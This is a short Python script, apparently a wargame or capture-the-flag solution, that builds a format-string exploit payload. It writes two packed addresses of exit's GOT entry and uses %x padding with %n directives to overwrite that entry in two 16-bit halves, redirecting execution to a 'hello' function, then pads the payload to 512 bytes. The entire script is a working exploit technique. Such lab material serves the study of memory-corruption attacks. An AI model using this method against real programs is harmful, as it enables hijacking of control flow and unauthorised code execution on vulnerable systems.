import struct

HELLO = 0x80484b4
EXIT_PLT = 0x8049724

def pad(s):
	# `512-len(s)` is used to adjust the total string that will be returned to be 512
	return s+"X"*(512-len(s))

exploit = ""
exploit += struct.pack("I",EXIT_PLT)
exploit += struct.pack("I",EXIT_PLT+2)
exploit += "BBBBCCCC"

# write the lower 16 bits first
exploit += "%4$33972x"
exploit += "%4$n"

# and then write the 16 upper bits
exploit += "%30x"
exploit += "%5$n"

print(pad(exploit))
